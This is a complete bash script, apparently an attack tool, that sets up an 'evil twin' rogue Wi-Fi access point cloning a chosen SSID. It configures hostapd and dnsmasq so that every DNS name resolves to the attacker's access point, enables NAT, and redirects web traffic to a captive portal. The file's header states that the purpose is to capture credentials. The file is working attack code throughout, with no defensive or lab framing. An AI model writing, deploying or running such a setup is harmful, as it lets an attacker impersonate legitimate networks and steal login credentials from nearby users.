#!/usr/bin/env bash
# file: evil_twin.sh, target: Linux (requires hostapd, dnsmasq, iptables, root)
# Creates a rogue AP cloning a target SSID to capture credentials via captive portal.

read -rp "Interface for AP (ex: wlan1): " AP_IFACE
read -rp "SSID to clone: " SSID
read -rp "Channel: " CH
read -rp "Internet-connected interface (for NAT, ex: eth0): " NET_IFACE

HOSTAPD_CONF="/tmp/evil_twin_hostapd.conf"
DNSMASQ_CONF="/tmp/evil_twin_dnsmasq.conf"
AP_IP="192.168.99.1"

cat > "$HOSTAPD_CONF" <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
channel=$CH
hw_mode=g
ignore_broadcast_ssid=0
EOF

cat > "$DNSMASQ_CONF" <<EOF
interface=$AP_IFACE
dhcp-range=192.168.99.10,192.168.99.50,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
no-resolv
EOF

echo "[*] Configuring AP interface..."
ip addr flush dev "$AP_IFACE"
ip addr add "$AP_IP/24" dev "$AP_IFACE"
ip link set "$AP_IFACE" up

echo "[*] Enabling IP forwarding and NAT..."
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o "$NET_IFACE" -j MASQUERADE
iptables -A FORWARD -i "$AP_IFACE" -o "$NET_IFACE" -j ACCEPT
iptables -A FORWARD -i "$NET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
# Captive portal redirect
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j DNAT --to-destination "$AP_IP:80"

echo "[*] Starting dnsmasq..."
dnsmasq -C "$DNSMASQ_CONF" --no-daemon &
DNSMASQ_PID=$!

echo "[*] Starting hostapd (AP)..."
hostapd "$HOSTAPD_CONF"

kill $DNSMASQ_PID 2>/dev/null
echo "[+] Evil twin stopped."
